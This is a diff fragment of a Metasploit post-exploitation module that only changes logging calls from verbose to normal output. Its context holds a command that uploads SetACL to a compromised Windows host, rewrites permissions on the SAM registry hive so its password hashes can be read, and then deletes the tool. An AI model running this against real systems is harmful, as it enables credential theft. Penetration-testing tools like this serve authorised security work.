@@ -74,16 +74,16 @@ class Metasploit3 < Msf::Post
 			
 			# upload subinacls and ajust permissions on key to be able to read the SAM Key
 			if sysinfo['OS'] =~ /Windows 2008|7|Vista/
-				vprint_status("Uploading file SetACL")
+				print_status("Uploading file SetACL")
 				on_trg = upload_subinacls
 				if not on_trg.empty?
 					# Changing permission on loaded SAM Registry key
-					vprint_status("Executing command to change permissions on SAM key")
+					print_status("Executing command to change permissions on SAM key")
 					exec_results = cmd_exec("cmd","/c #{on_trg} -on \"HKEY_LOCAL_MACHINE\\shdsam\" -ot reg -actn ace -ace \"n:Administrators;p:full;i:so;m:set\" -actn setprot -op \"dacl:np\" -actn clear -clr \"dacl\" -actn rstchldrn -rst \"dacl\"")
 					vprint_status(exec_results)
 					
 					# Removing file on target
-					vprint_status("Deleting #{on_trg}")
+					print_status("Deleting #{on_trg}")
 					session.fs.file.rm(on_trg)
 				end
 			end
